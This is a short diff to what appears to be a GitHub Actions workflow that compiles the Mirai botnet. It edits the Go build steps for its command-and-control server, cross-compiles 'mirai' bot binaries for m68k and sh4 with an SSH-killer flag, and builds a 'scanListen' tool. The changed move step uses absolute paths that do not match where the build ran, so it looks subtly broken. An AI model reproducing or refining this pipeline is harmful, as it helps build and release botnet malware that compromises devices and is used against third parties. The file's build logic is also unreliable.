@@ -23,10 +23,9 @@ jobs:
       - name: Install Go dependencies
         run: |
           cd cnc
-          go mod init
-          go mod tidy
           go get github.com/go-sql-driver/mysql
           go get github.com/mattn/go-shellwords
+          go build
           cd ..
 
       - name: Compile release
@@ -64,7 +63,7 @@ jobs:
             compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static" || true
             compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static" || true
 
-            go build -o release/cnc cnc/*.go
+            mv /cnc/cnc /release
             go build -o release/scanListen tools/scanListen.go
           elif [ "$BUILD_MODE" == "debug" ]; then
             gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -g -o debug/mirai.dbg
